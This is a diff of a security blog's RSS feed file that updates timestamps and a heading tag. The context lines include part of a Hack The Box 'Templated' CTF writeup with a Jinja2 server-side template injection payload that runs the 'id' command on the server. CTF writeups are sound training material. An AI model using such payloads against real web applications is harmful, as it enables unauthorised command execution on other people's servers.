@@ -3,7 +3,7 @@
     <title>Offens!ve Blogs</title>
     <link href="https://sakibulalikhan.github.io/feed.xml" rel="self" />
     <link href="https://sakibulalikhan.github.io" />
-    <updated>2023-08-25T00:04:22+06:00</updated>
+    <updated>2023-08-25T01:01:47+06:00</updated>
     <author>
         <name>Sakibul Ali Khan</name>
     </author>
@@ -96,7 +96,7 @@
             <category term="HTB"/>
             <category term="CTF Writeups"/>
 
-        <updated>2023-08-19T03:11:00+06:00</updated>
+        <updated>2023-08-25T01:01:47+06:00</updated>
             <summary>
                 <![CDATA[
                         <img src="https://sakibulalikhan.github.io/media/posts/7/Templated.jpg" alt="Templated — HTB Web Challenge Writeup" />
@@ -124,7 +124,7 @@
 <div class="kl km aov"><figure class="bg yx yy c"><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*xko-JwNVbZLFqyi9rFhlTg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*xko-JwNVbZLFqyi9rFhlTg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*xko-JwNVbZLFqyi9rFhlTg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*xko-JwNVbZLFqyi9rFhlTg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*xko-JwNVbZLFqyi9rFhlTg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*xko-JwNVbZLFqyi9rFhlTg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xko-JwNVbZLFqyi9rFhlTg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*xko-JwNVbZLFqyi9rFhlTg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*xko-JwNVbZLFqyi9rFhlTg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*xko-JwNVbZLFqyi9rFhlTg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*xko-JwNVbZLFqyi9rFhlTg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*xko-JwNVbZLFqyi9rFhlTg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*xko-JwNVbZLFqyi9rFhlTg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*xko-JwNVbZLFqyi9rFhlTg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img  role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*xko-JwNVbZLFqyi9rFhlTg.png" alt="" width="700" height="300" loading="lazy" data-is-external-image="true"></figure></picture></div>
 </div>
 </figure>
-<h1 id="f449" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">Now we are going to exploit this using SSTI</h1>
+<h3 id="f449" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">Now we are going to exploit this using SSTI</h3>
 <p id="3fc5" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">Use the bellow payloads to begin our exploitation to get the flag!</p>
 <pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="0d2a" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">{{request.application.__globals__.__builtins__.__import__(<span class="hljs-string">'os'</span>).<span class="hljs-built_in">popen</span>(<span class="hljs-string">'id'</span>).<span class="hljs-built_in">read</span>()}}</span></pre>
 <figure class="yq yr ys yt yu yv kl km paragraph-image">
